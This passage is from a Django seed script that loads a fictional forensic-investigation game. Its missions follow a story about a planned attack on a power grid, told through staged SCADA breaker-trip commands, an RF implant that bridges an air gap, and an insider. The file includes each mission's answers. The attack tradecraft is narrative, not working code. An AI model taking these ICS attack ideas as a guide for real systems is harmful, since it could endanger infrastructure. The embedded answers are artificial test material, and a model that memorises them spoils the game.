  IV:  First 16 bytes of each encrypted blob (per-file IV)

This key decrypts the 1.887GB staged on the DC.
Use for data recovery in next mission.""",
      'has_clue':True,'clue_tag':'CRYPT',
      'clue_text':'AES-256-CBC key: 4A7F3C9E1B5D8F2A6C0E4B8D2F6A0C4E. IV = first 16 bytes per file. This decrypts the 1.887GB staged archive on the domain controller.'},
   ],
   'logs':[
     {'order':1,'time_label':'MALWARE','level':'WARN','message':'Layer 1: base64 outer wrapper identified'},
     {'order':2,'time_label':'MALWARE','level':'WARN','message':'Layer 2: XOR key 0x4B — brute forced'},
     {'order':3,'time_label':'MALWARE','level':'CRIT','message':'Exfil domain: update-telemetry.io | AES key recovered'},
     {'order':4,'time_label':'MALWARE','level':'CRIT','message':'1.887GB staged on DC — recoverable'},
   ]},

  {'order':10,'code':'2.5','difficulty':'EXPERT',
   'title':'LEVEL 2.5 — DECRYPT THE DOSSIER',
   'level_group':'LEVEL 2: BLACKSITE PROTOCOL',
   'brief':'<span class="mission-meta">CASE FILE: Project HELIX — Data Recovery</span><br>1.887GB of staged encrypted files remain on the DC. Decrypt and triage them. A steganographic payload is hidden in one screenshot. Extract it and provide the <span class="mission-target">operation codename</span>.',
   'target_hint':'Decrypt the archive and extract the LSB steganographic payload from screenshot_batch_0047.png',
   'answer':'operation lacuna','time_limit':220,'hint_cost':150,'total_clues':4,
   'hint_text':'AES-256-CBC, key from prev mission, IV = first 16 bytes per blob. LSB stego in Blue channel of screenshot_batch_0047.png.',
   'files':[
     {'path':'Recovery','filename':'AES_Decryption_Log.txt',
      'content':"""[DECRYPTION — AES-256-CBC]
Key: 4A7F3C9E1B5D8F2A6C0E4B8D2F6A0C4E
IV:  First 16 bytes per blob

Results:
  creds_dump_01.enc     → creds_dump_01.txt    312KB
  keylog_20310314.enc   → keylog.txt           4.2MB
  screenshots_batch_*   → 1,575 PNG files

screenshot_batch_0047.png  HIGH ENTROPY in lower bits — FLAGGED""",
      'has_clue':True,'clue_tag':'FILE',
      'clue_text':'AES-256-CBC decryption successful. screenshot_batch_0047.png flagged HIGH ENTROPY in lower bits — steganographic content.'},
     {'path':'Recovery','filename':'Sensitivity_Triage.txt',
      'content':"""Classification:
  UNCLASSIFIED:    412 files (22%)
  CONFIDENTIAL:    891 files (47%)
  SECRET:          384 files (20%)
  TOP SECRET/SCI:   11 files (0.6%)

Critical:
  HELIX-PHASE3-SUMMARY.pdf (TOP SECRET)
  Content: Classified satellite SCADA communication protocol
  Protocol matches control standard for Eastern European power grid
  Affects ~40 million users""",
      'has_clue':True,'clue_tag':'FILE',
      'clue_text':'HELIX-PHASE3-SUMMARY.pdf (TS/SCI): satellite SCADA protocol for Elektra Grid — 40M users. PHANTOM CIRCUIT target is infrastructure disruption, not data theft.'},
     {'path':'Recovery','filename':'Steg_Extraction.txt',
      'content':"""[LSB STEGANOGRAPHY — screenshot_batch_0047.png]
Method: Least Significant Bit — Blue channel
Result:

  ╔═══════════════════════════════════════╗
  ║  OPERATION LACUNA                     ║
  ║  TARGET: ELEKTRA GRID CONSORTIUM      ║
  ║  PHASE: ACTIVE                        ║
  ║  WINDOW: 96 HRS                       ║
  ║  AUTH: LACE                           ║
  ╚═══════════════════════════════════════╝

NEXUS: OPERATION LACUNA IS ACTIVE.
96-HOUR ATTACK WINDOW. Classification: RED.""",
      'has_clue':True,'clue_tag':'STEG',
      'clue_text':'CRITICAL LSB steg: OPERATION LACUNA — TARGET: ELEKTRA GRID CONSORTIUM — 96HR WINDOW — AUTH: LACE. Classification elevated to RED.'},
     {'path':'Recovery','filename':'HELIX_Phase3_Fragment.txt',
      'content':"""[HELIX-PHASE3-SUMMARY.pdf — PARTIAL EXTRACT]
"...the HELIX-COMM-7 satellite protocol provides authenticated
uplink to distributed SCADA nodes controlling the Elektra Grid
Consortium's Eastern European distribution network affecting
approximately 40 million end users...
...compromised authentication allows unauthorized WRITE commands
to substation protective relay systems..." """,
      'has_clue':True,'clue_tag':'FILE',
      'clue_text':'HELIX-COMM-7 protocol used by Elektra Grid SCADA for 40M users. Compromised auth allows unauthorized WRITE to substation relays — blackout capability confirmed.'},
   ],
   'logs':[
     {'order':1,'time_label':'DECRYPT','level':'INFO','message':'AES-256-CBC: 1,887 files recovered'},
     {'order':2,'time_label':'DECRYPT','level':'CRIT','message':'TS/SCI: HELIX-PHASE3 — satellite SCADA protocol'},
     {'order':3,'time_label':'DECRYPT','level':'CRIT','message':'LSB STEG: OPERATION LACUNA — Elektra Grid — 96HR WINDOW'},
     {'order':4,'time_label':'DECRYPT','level':'CRIT','message':'NEXUS: Threat classification elevated to RED'},
   ]},

  # ─────────────── LEVEL 3 ───────────────
  {'order':11,'code':'3.1','difficulty':'ELITE',
   'title':"LEVEL 3.1 — THE THREAT ACTOR'S BLUEPRINT",
   'level_group':'LEVEL 3: OPERATION LACUNA',
   'brief':'<span class="mission-meta">OPERATION LACUNA — Threat Intelligence</span><br>PHANTOM CIRCUIT purchased a zero-day for SCADA HMI software. Identify the <span class="mission-target">CVE identifier</span> of the zero-day exploit used against Elektra Grid.',
   'target_hint':'Find the CVE for the WinCC OA historian RCE zero-day from the dark web listing',
   'answer':'cve-2031-0day-wincc-04471','time_limit':240,'hint_cost':150,'total_clues':4,
   'hint_text':'The dark web listing specifies the CVE assigned 3 months after sale. Check the CVE timeline file.',
   'files':[
     {'path':'ThreatIntel','filename':'DarkWeb_Listing.txt',
      'content':"""[NEXUS DARK WEB INTEL PLATFORM — ARCHIVED LISTING]
Title: "WinCC OA 0DAY — Historian Interface RCE — UNPATCHED"
Seller: @vuln_merchant_k
Price: 0.85 BTC
Date Sold: 2030-08-19 (to PHANTOM CIRCUIT affiliate wallet)

Vulnerability:
  Software: Simatic WinCC OA v3.17-v3.18.1
  Component: Historian Data Interface (port 5678)
  Type: Unauthenticated RCE (malformed XML)
  Patch status at sale: UNPATCHED (true 0-day)
  CVE assigned: CVE-2031-0DAY-WINCC-04471
  Patch released: 2031-01-09""",
      'has_clue':True,'clue_tag':'INTEL',
      'clue_text':'Dark web listing: WinCC OA historian RCE sold to PHANTOM CIRCUIT 2030-08-19. CVE-2031-0DAY-WINCC-04471 assigned 3 months post-sale. True 0-day for 144 days.'},
     {'path':'ThreatIntel','filename':'Shodan_Censys_Scan.txt',
      'content':"""[SHODAN/CENSYS — WinCC OA v3.17-v3.18.1 — internet exposed]
14 instances worldwide:
  203.0.113.44  DE  Stadtwerke München    v3.18.0  PATCHED
  198.51.100.22 PL  Energa Operator SA    v3.17    UNPATCHED
  192.0.2.77    EE  Elektra Grid Consortium v3.18.1 UNPATCHED ← TARGET
  185.199.108.55 HU MVM Paks Nuclear      v3.18.1  PATCHED

CRITICAL: Elektra Grid 192.0.2.77 — unpatched, port 5678 open.
Exact attack surface for CVE-2031-0DAY-WINCC-04471.""",
      'has_clue':True,'clue_tag':'NET',
      'clue_text':'Shodan: Elektra Grid IP 192.0.2.77 — unpatched WinCC OA v3.18.1, historian port 5678 open. Exact match for PHANTOM CIRCUIT purchased exploit.'},
     {'path':'ThreatIntel','filename':'Seller_Profile.txt',
      'content':"""[vuln_merchant_k — THREAT INTEL PROFILE]
Speciality: ICS/SCADA/OT zero-days exclusively
Sales confirmed (by wallet cluster):
  2029-03: Cisco IOS-XE auth bypass → APT41
  2029-08: Schneider EcoStruxure RCE → PHANTOM CIRCUIT?
  2030-08: WinCC OA historian RCE → PHANTOM CIRCUIT confirmed
  2030-12: Siemens S7 spoofing → APT28

Cross-reference: same operational cluster as _r3dshift (Level 1.2)
PHANTOM CIRCUIT uses _r3dshift for HUMINT, vuln_merchant_k for 0days.""",
      'has_clue':True,'clue_tag':'INTEL',
      'clue_text':'vuln_merchant_k: ICS/SCADA 0-day specialist. Same cluster as _r3dshift (VaultEdge). PHANTOM CIRCUIT operational structure: HUMINT + 0-day + insider capabilities.'},
     {'path':'ThreatIntel','filename':'CVE_Timeline.txt',
      'content':"""CVE-2031-0DAY-WINCC-04471 Timeline:
  2030-08-17: Vuln listed on dark web
  2030-08-19: Sold to PHANTOM CIRCUIT
  2030-09-01: Elektra Grid targeting begins
  2030-11-22: Siemens PSIRT notified
  2031-01-09: Patch released (WinCC OA v3.19)
  2031-01-14: PHANTOM_IMPLANT_v3.1 built using this CVE
  2031-03-12: NEXUS detects HELIX — LACUNA clock starts

0-day window: 144 days. Elektra Grid: STILL UNPATCHED.""",
      'has_clue':True,'clue_tag':'INTEL',
      'clue_text':'Timeline: 144-day 0-day window. Elektra Grid still unpatched when LACUNA clock starts. 8 months from purchase to deployment — sophisticated long-lead planning.'},
   ],
   'logs':[
     {'order':1,'time_label':'INTEL','level':'CRIT','message':'WinCC OA 0-day sold to PHANTOM CIRCUIT 2030-08-19'},
     {'order':2,'time_label':'INTEL','level':'CRIT','message':'Elektra Grid — unpatched CVE-2031-0DAY-WINCC-04471 exploitable'},
     {'order':3,'time_label':'INTEL','level':'CRIT','message':'144-day exploitation window — still unpatched'},
   ]},

  {'order':12,'code':'3.2','difficulty':'ELITE',
   'title':'LEVEL 3.2 — INSIDE THE GRID',
   'level_group':'LEVEL 3: OPERATION LACUNA',
   'brief':'<span class="mission-meta">OPERATION LACUNA — ICS/SCADA Forensics</span><br>Elektra Grid grants NEXUS emergency OT network access. Something is already inside. Find the pre-staged attack. Identify the <span class="mission-target">watchdog tag name</span> that triggers the coordinated breaker trips.',
   'target_hint':'Find the trigger watchdog tag in the staged SCADA breaker commands',
   'answer':'SYS.WATCHDOG.LACUNA_TRIGGER','time_limit':220,'hint_cost':150,'total_clues':4,
   'hint_text':'The staged writ commands are in the historian audit log. They have a trigger condition — find the tag name in the WHEN clause.',
   'files':[
     {'path':'SCADA_Logs','filename':'Historian_QueryLog.txt',
      'content':"""[WinCC OA Historian — Anomaly Report]
Normal ops: 1-20 tags per session, business hours

ANOMALOUS — 2031-01-09 03:17-03:44 UTC (Sunday 3AM):
  Source: ENG-WS-03 (engineer_svc1 credentials)
  Queries: 47,291 tags — ENTIRE DATABASE
  Categories: all 12 substations, 847 breaker tags,
              234 protective relay configs, 89 watchdog tags

RECONNAISSANCE — not legitimate engineering work.
No maintenance window scheduled.""",
      'has_clue':True,'clue_tag':'SCADA',
      'clue_text':'Historian: ENG-WS-03 queried all 47,291 SCADA tags at 3AM Sunday (no maintenance window) — full topology mapped. All substation breaker and watchdog tags enumerated.'},
     {'path':'SCADA_Logs','filename':'ENG_WS_AccessLog.txt',
      'content':"""ENG-WS-03 Physical Access:
  2031-01-09 03:08: UNREGISTERED — no badge swipe  ← ANOMALY
  Network auth: engineer_svc1 — correct creds (shared account, no MFA)

USB history ENG-WS-03:
  2031-01-09 03:09: Unregistered Sandisk 16GB inserted
  .lnk file exploitation — auto-executed from USB root
  Payload dropped: C:\\ProgramData\\Siemens\\update.exe

Contractor visit log:
  2030-12-22: DeltaCore Solutions DC-0047 — "security assessment"
  (Same contractor from VaultEdge Level 1!)""",
      'has_clue':True,'clue_tag':'SCADA',
      'clue_text':'ENG-WS-03: 3AM entry without badge. USB .lnk exploit auto-ran. Visiting contractor: DeltaCore Solutions DC-0047 — same actor from VaultEdge Level 1.'},
     {'path':'SCADA_Logs','filename':'Staged_Commands.txt',
      'content':"""[HISTORIAN — STAGED WRIT COMMANDS — PHANTOM CIRCUIT]
Written by compromised ENG-WS-03 session (2031-01-09)

Command 1:
  Tag: SUB-ALPHA.BREAKER.MAIN_OUT.STATUS → 0 (OPEN)
  Condition: WHEN SYS.WATCHDOG.LACUNA_TRIGGER = 1

Command 2:
  Tag: SUB-BETA.BREAKER.FEEDER_A.STATUS → 0 (OPEN)
  Condition: WHEN SYS.WATCHDOG.LACUNA_TRIGGER = 1

Command 3:
  Tag: SUB-GAMMA.BREAKER.MAIN_OUT.STATUS → 0 (OPEN)
  Condition: WHEN SYS.WATCHDOG.LACUNA_TRIGGER = 1

Simultaneous trip of 3 substations → cascading grid failure.
Affects ~40 million people.""",
      'has_clue':True,'clue_tag':'SCADA',
      'clue_text':'CRITICAL: 3 breaker-trip commands pre-staged. All trigger simultaneously when SYS.WATCHDOG.LACUNA_TRIGGER = 1. External signal required — covert channel needed.'},
     {'path':'SCADA_Logs','filename':'CovertChannel_Indicator.txt',
      'content':"""OT NETWORK ANOMALY:
Spectrum analysis at perimeter (2031-03-10):
  Signal: 433MHz narrowband — NOT licensed in facility
  Source: Sub-basement B area
  Timing: 15s bursts, ~every 2 hours

Firewall: all internet blocked (air gap enforced)
RF emissions: NOT covered by firewall — BLIND SPOT

Conclusion: Air gap defeated via RF hardware implant.
Trigger will arrive via RF, not network.""",
      'has_clue':True,'clue_tag':'NET',
      'clue_text':'433MHz RF from Sub-basement B — unregistered, unlicensed. Air gap bypassed via RF hardware implant. LACUNA_TRIGGER signal will be delivered by radio.'},
   ],
   'logs':[
     {'order':1,'time_label':'SCADA','level':'CRIT','message':'47,291 tags enumerated at 3AM — full SCADA topology stolen'},
     {'order':2,'time_label':'SCADA','level':'CRIT','message':'ENG-WS-03: USB .lnk exploit — DeltaCore contractor 18 days prior'},
     {'order':3,'time_label':'SCADA','level':'CRIT','message':'3 staged breaker-trips — trigger: SYS.WATCHDOG.LACUNA_TRIGGER=1'},
     {'order':4,'time_label':'SCADA','level':'CRIT','message':'433MHz RF covert channel — air gap compromised'},
   ]},

  {'order':13,'code':'3.3','difficulty':'ELITE',
   'title':'LEVEL 3.3 — THE INVISIBLE BRIDGE',
   'level_group':'LEVEL 3: OPERATION LACUNA',
   'brief':'<span class="mission-meta">OPERATION LACUNA — RF/Covert Channel Forensics</span><br>A hardware RF implant bypasses the OT air gap. The trigger command was transmitted but failed. You have one window. Identify the <span class="mission-target">serial number</span> of the RF hardware implant.',
   'target_hint':'Recover the hardware implant serial number from the device identification or procurement records',
   'answer':'RFM69HW-2030-SN-004471','time_limit':200,'hint_cost':150,'total_clues':4,
   'hint_text':'Decode the FSK signal, identify the RF module model, then find the serial in the JTAG readout or procurement trace.',
   'files':[
     {'path':'RF_Analysis','filename':'Spectrum_Capture.txt',
      'content':"""[SPECTRUM ANALYSIS — 433MHz]
Frequency:  433.920 MHz (ISM sub-GHz)
Modulation: 2-FSK | Deviation: ±12.5 kHz
Data rate:  4800 baud | Burst: ~180 bytes
Source:     Sub-basement B, switch cabinet area

NOT matching any licensed facility equipment.
Signal strength consistent with indoor source ~30m.""",
      'has_clue':True,'clue_tag':'RF',
      'clue_text':'433.920 MHz 2-FSK at 4800 baud. No licensed facility equipment at this frequency. Triangulates to Sub-basement B switch cabinet area.'},
     {'path':'RF_Analysis','filename':'FSK_Demodulation.txt',
      'content':"""[FSK DEMODULATION RESULT]
Frame sync: AA AA AA 2D D4 (standard HopeRF preamble)
Decoded payload (2031-03-15 02:17:33 UTC):
  Payload: "LACUNA_TRIGGER" | Value: 01

IMPLANT RESPONSE: "FAIL TIMEOUT"
  Reason: time_sync_valid = FALSE (NTP sync lost 6hrs prior)

PHANTOM CIRCUIT does not know the trigger failed.
They WILL retransmit. NEXUS has a window.""",
      'has_clue':True,'clue_tag':'RF',
      'clue_text':'DECODED: LACUNA_TRIGGER=1 sent but implant returned FAIL TIMEOUT — NTP sync lost. PHANTOM CIRCUIT believes it succeeded. Retransmit expected.'},
     {'path':'RF_Analysis','filename':'RF_Module_ID.txt',
      'content':"""[RF MODULE IDENTIFICATION]
Frame structure matches: HopeRF RFM69HW
  Standard FSK preamble AA AA AA 2D D4 ✓
  NODE_ID field format ✓
  CRC-16 implementation ✓

Location: Sub-basement B, Cabinet CB-07
  Hidden inside patch panel P-3 (disguised as passive cable manager)

Serial (JTAG readout from recovered device):
  RFM69HW-2030-SN-004471""",
      'has_clue':True,'clue_tag':'RF',
      'clue_text':'Module: HopeRF RFM69HW sub-GHz transceiver ($4, commodity hardware). Hidden in patch panel CB-07 Sub-basement B. Serial: RFM69HW-2030-SN-004471 (JTAG).'},
     {'path':'RF_Analysis','filename':'Retransmit_Trace.txt',
      'content':"""[RETRANSMIT — 2031-03-15 14:44:07 UTC]
PHANTOM CIRCUIT retransmitted after 12h.
Second trigger: LACUNA_TRIGGER=1
NTP restored — trigger ACCEPTED.

NEXUS 2-point DF:
  Point A: bearing 127° -58dBm
  Point B: bearing  89° -51dBm
  Intersection: 53.4821°N 25.7619°E

→ Ul. Promyshlennaya 14, Unit 3B — Minsk Industrial Zone
  Leased under LACE operating alias.
  LACE is physically present. 18-hour arrest window.""",
      'has_clue':True,'clue_tag':'RF',
      'clue_text':'Retransmit DF triangulates to Ul. Promyshlennaya 14 Unit 3B, Minsk — leased by LACE alias. LACE physically present. 18-hour arrest window confirmed.'},
   ],
   'logs':[
     {'order':1,'time_label':'RF','level':'WARN','message':'433MHz FSK signal: Sub-basement B'},
     {'order':2,'time_label':'RF','level':'CRIT','message':'Decoded: LACUNA_TRIGGER=1 — IMPLANT FAIL (NTP lost)'},
     {'order':3,'time_label':'RF','level':'CRIT','message':'Retransmit trapped — LACE location: Minsk Industrial Zone'},
   ]},

  {'order':14,'code':'3.4','difficulty':'ELITE',
   'title':'LEVEL 3.4 — THE MOLE',
   'level_group':'LEVEL 3: OPERATION LACUNA',
   'brief':'<span class="mission-meta">OPERATION LACUNA — Insider Threat</span><br>The RF implant was procured through Elektra Grid IT. Someone inside works with PHANTOM CIRCUIT. Identify the <span class="mission-target">insider\'s full name</span>.',
   'target_hint':'Cross-reference procurement auth, badge access logs and encrypted comms to name the insider',
   'answer':'dmitri volkov','time_limit':200,'hint_cost':150,'total_clues':4,
   'hint_text':'The procurement authorisation signature points to a manager with a CV gap. Check badge access for Sub-basement B on the implant installation date.',
   'files':[
     {'path':'InsiderInvestigation','filename':'Procurement_Records.txt',
      'content':"""[IT PROCUREMENT — BATCH ORDER 2030-11-14]
Title: "Network diagnostic and monitoring equipment"
Approved by: D. Volkov (IT Infrastructure Manager)
Value: €3,847 (below €5,000 dual-approval threshold)

Line items:
  24-port patch panel x4          €812
  Cable management trays x8      €224
  "Network diagnostic module, sub-GHz"  €147  ← FLAGGED
    Vendor: ElectroComponents Ltd
    Part: RFM69HW-DEVBOARD-v2 (hobby electronics — not IT infra)
  SFP+ transceivers x12         €2,664

Priced below threshold to avoid dual-signature review.""",
      'has_clue':True,'clue_tag':'FILE',
      'clue_text':'D. Volkov approved RFM69HW RF module disguised as "network diagnostic" — priced below dual-approval threshold. Hired 11 months ago.'},
     {'path':'InsiderInvestigation','filename':'Volkov_HR_File.txt',
      'content':"""Full Name: Dmitri Alekseyevich Volkov
Hired: 2030-04-01 (IT Infrastructure Manager)
CV gap: 2027-2029 (2 years — "independent IT consulting, undisclosed clients")
Reference: Single uncontactable referee

NEXUS CROSS-REFERENCE:
  2027-2029 matches PHANTOM CIRCUIT active recruitment window.
  CV gap aligns with known conditioning period for moles.

Badge Access — Sub-basement B (restricted):
  2030-12-22 02:14  ← implant installation date
  2031-01-09 03:01  ← SCADA recon night
  2031-02-14 01:55  ← 3AM, no work order filed""",
      'has_clue':True,'clue_tag':'FILE',
      'clue_text':'Volkov: 2-year CV gap matches PHANTOM CIRCUIT recruitment window. Badged into Sub-basement B 3× outside business hours — including implant installation night.'},
     {'path':'InsiderInvestigation','filename':'NetworkActivity.txt',
      'content':"""Volkov workstation — DPI analysis:
Destination: 185.220.101.33:443 (Mullvad VPN endpoint)
Timing: Every Thursday 20:00-21:00 UTC
Duration: 45-90 minutes per session
Pattern: 14 consecutive Thursdays (3.5 months)

→ Regular fixed-time encrypted channel = handler communication.

Email drafts folder (unsent):
"LACUNA proceed. Window confirmed 96h. DC route clear.
 Package delivered Sub-B. LACE acknowledge."
Used as dead drop — both parties access same account.""",
      'has_clue':True,'clue_tag':'NET',
      'clue_text':'VPN: Mullvad every Thursday 20:00 UTC for 14 consecutive weeks — handler cadence. Draft dead drop confirms Volkov authored "LACUNA proceed" for LACE.'},
     {'path':'InsiderInvestigation','filename':'TrueCrypt_Messages.txt',
      'content':"""[TRUECRYPT VOLUME — DECRYPTED]
Password: "the bridge in Minsk 1989" (derived from email draft fragments)

Message 2031-03-01 (from LACE):
  "Confirm implant operational. Trigger T-96. Payment 3.5 BTC.
   Extraction via route DELTA after confirmation."

Message 2031-03-08 (from Volkov):
  "Implant confirmed. SCADA commands staged. Grid topology complete."

Message 2031-03-14 (from LACE):
  "Trigger transmitted. Expect blackout in 2 hours.
   Prepare extraction. Relay: Ul. Promyshlennaya 14, Unit 3B." """,
      'has_clue':True,'clue_tag':'CRYPT',
      'clue_text':'TrueCrypt decrypted: Volkov ↔ LACE messages confirm insider role. Relay station address from LACE message matches RF triangulation. Arrest warrant ready.'},
   ],
   'logs':[
     {'order':1,'time_label':'INSIDER','level':'WARN','message':'Volkov approved RFM69HW below dual-signature threshold'},
     {'order':2,'time_label':'INSIDER','level':'WARN','message':'3x Sub-basement B at 2-3AM — no work orders'},
     {'order':3,'time_label':'INSIDER','level':'CRIT','message':'VPN: Mullvad Thu 20:00 UTC — 14 consecutive weeks (handler comms)'},
     {'order':4,'time_label':'INSIDER','level':'CRIT','message':'TrueCrypt: Volkov ↔ LACE messages confirm insider role'},
   ]},

  {'order':15,'code':'3.5','difficulty':'ELITE',
   'title':'LEVEL 3.5 — THE CHAIN OF CUSTODY',
   'level_group':'LEVEL 3: OPERATION LACUNA',
   'brief':'<span class="mission-meta">FINAL MISSION — Legal Forensics & Attribution</span><br>Assemble the complete evidentiary chain to secure the international arrest warrant. NEXUS AI matches LACE to a historical case. Provide the <span class="mission-target">prior alias</span> of the LACE threat actor.',
   'target_hint':'Cross-reference LACE operational signature against NEXUS historical case files',
   'answer':'_v3ctor_prime','time_limit':180,'hint_cost':150,'total_clues':4,
   'hint_text':'The NEXUS historical case database entry shows the prior alias. Match LACE writing pattern and infrastructure to the closed case from 4 years ago.',
   'files':[
     {'path':'EvidencePackage','filename':'Master_Timeline.txt',
      'content':"""[OPERATION LACUNA — MASTER TIMELINE]
2030-08-19: 0-day purchased (Level 3.1)
2030-09-01: DeltaCore begins VaultEdge engagement
2030-11-14: Volkov approves RF implant procurement
2030-12-22: RF implant installed by Volkov, Sub-basement B
2031-01-09: SCADA topology mapped + breaker commands staged
2031-02-24: Phishing domain registered (Level 1.4)
2031-02-26: Phishing email sent → credentials harvested
2031-03-12 02:11: mhale account re-enabled
2031-03-12 02:14: Ghost login — algorithms exfiltrated
2031-03-14: HELIX infection detected
2031-03-15 02:17: LACUNA_TRIGGER transmitted — FAIL (NTP)
2031-03-15 14:44: Retransmit — LACE location triangulated
2031-03-16: NEXUS warrant filed — LACE in custody [PENDING]

All 15 timestamps: corroborated by 2+ independent sources ✓""",
      'has_clue':True,'clue_tag':'LEGAL',
      'clue_text':'Master timeline: 18-month coordinated campaign. All 15 events corroborated by 2+ independent sources. Chain spans VaultEdge, HELIX, and Elektra Grid.'},
     {'path':'EvidencePackage','filename':'HashVerification.txt',
      'content':"""[SHA-256 CHAIN OF CUSTODY — ALL CRITICAL EVIDENCE]
Security.evtx.txt              e3b4c9f1...  INTACT ✓
SYSTEM_USBSTOR.reg             3f7c1a9e...  INTACT ✓
phishing_email_raw.txt         7b1e4d9f...  INTACT ✓
HELIX_memdump_PID1144.bin      aa7b3f1c...  INTACT ✓
SCADA_staged_commands.log      5c8e1d4f...  INTACT ✓
RF_spectrum_capture.wav        2f5b8e1c...  INTACT ✓
TrueCrypt_volume.tc            0c3f6a9d...  INTACT ✓

ALL CRITICAL EVIDENCE: HASH VERIFIED — CHAIN OF CUSTODY INTACT
Evidence admissible in EU and US federal jurisdictions.""",
      'has_clue':True,'clue_tag':'LEGAL',
      'clue_text':'All 7 critical evidence items: SHA-256 hash at collection = current hash. Zero tampering. Chain of custody intact. Admissible in EU and US federal court.'},
     {'path':'EvidencePackage','filename':'MITRE_Attribution.txt',
      'content':"""[MITRE ATT&CK MAPPING — PHANTOM CIRCUIT]
T1078    Valid Accounts (mhale ghost login)
T1566.002 Spearphish Link (VaultEdge phishing)
T1091    Removable Media (.lnk on ENG-WS-03)
T1055.001 DLL Injection (PHANTOM_IMPLANT in svchost)
T1071.004 DNS C2 (DoH secondary channel)
T1547.001 GPO Persistence (DC back door)
T1056.001 Keylogging (SetWindowsHookEx)
T0816    ICS Device Restart (staged breaker trips)

Attribution confidence: 95% HIGH
Infrastructure overlap with prior cases: 100%""",
      'has_clue':True,'clue_tag':'LEGAL',
      'clue_text':'8 MITRE ATT&CK TTPs mapped across full campaign. Attribution 95% HIGH confidence. Infrastructure 100% overlap with prior PHANTOM CIRCUIT cases.'},
     {'path':'EvidencePackage','filename':'NEXUS_Historical_Match.txt',
      'content':"""[NEXUS AI ATTRIBUTION — LACE OPERATOR PROFILE]
Submitted: LACE profile
  Thursday 20:00 UTC handler comms
  Mullvad VPN + TrueCrypt dead drop
  @nullvector.io email domain
  RFM69HW RF implant tradecraft
  Custom FSK encoding 433MHz

NEXUS AI MATCH: CASE #NC-2027-0188 ("Operation Wraith Protocol")
  Alias: _v3ctor_prime
  Target: critical infrastructure (power sector)
  Status: ARRESTED 2028-02-14 | RELEASED 2029-11-07 (technicality)
  Went dark → built PHANTOM CIRCUIT from scratch (2029-2031)

LACE = _v3ctor_prime

WARRANT APPROVED. LACE IN CUSTODY.
OPERATION LACUNA: NEUTRALISED.
40 MILLION PEOPLE NEVER LOSE POWER.""",
      'has_clue':True,'clue_tag':'INTEL',
      'clue_text':'NEXUS AI: LACE = _v3ctor_prime (Case #NC-2027-0188). Arrested 2028, released 2029 on technicality, rebuilt PHANTOM CIRCUIT. Same tradecraft fingerprint. Warrant approved.'},
   ],
   'logs':[
     {'order':1,'time_label':'LEGAL','level':'INFO','message':'Master timeline: 18-month campaign, all events corroborated'},
     {'order':2,'time_label':'LEGAL','level':'INFO','message':'SHA-256: all 7 critical evidence items INTACT'},
     {'order':3,'time_label':'LEGAL','level':'INFO','message':'MITRE: 8 TTPs mapped, 95% attribution confidence'},
     {'order':4,'time_label':'LEGAL','level':'CRIT','message':'NEXUS MATCH: LACE = _v3ctor_prime (Case #NC-2027-0188)'},
     {'order':5,'time_label':'LEGAL','level':'CRIT','message':'WARRANT APPROVED — OPERATION LACUNA NEUTRALISED'},
   ]},
]


class Command(BaseCommand):
    help = 'Load all 15 Digital Forensic Hunt missions into the database'

    def handle(self, *args, **kwargs):
        self.stdout.write('Clearing existing mission data...')
        Mission.objects.all().delete()

        for data in MISSIONS:
            mission = Mission.objects.create(
                order=data['order'], code=data['code'], title=data['title'],
                level_group=data['level_group'], difficulty=data['difficulty'],
                brief=data['brief'], target_hint=data['target_hint'],
                answer=data['answer'].lower(), time_limit=data['time_limit'],
                hint_text=data['hint_text'], hint_cost=data['hint_cost'],
                total_clues=data['total_clues'], is_active=True,
            )
            for f in data.get('files', []):
                MissionFile.objects.create(
                    mission=mission, path=f['path'], filename=f['filename'],
                    content=f['content'], has_clue=f.get('has_clue', False),
                    clue_tag=f.get('clue_tag', ''), clue_text=f.get('clue_text', ''),
                )
            for l in data.get('logs', []):
                MissionLog.objects.create(
                    mission=mission, order=l['order'],
                    time_label=l['time_label'], level=l['level'], message=l['message'],
                )
            self.stdout.write(f'  ✓ Mission {data["code"]} — {data["title"]}')

        self.stdout.write(self.style.SUCCESS(f'\n✓ {len(MISSIONS)} missions loaded successfully.'))
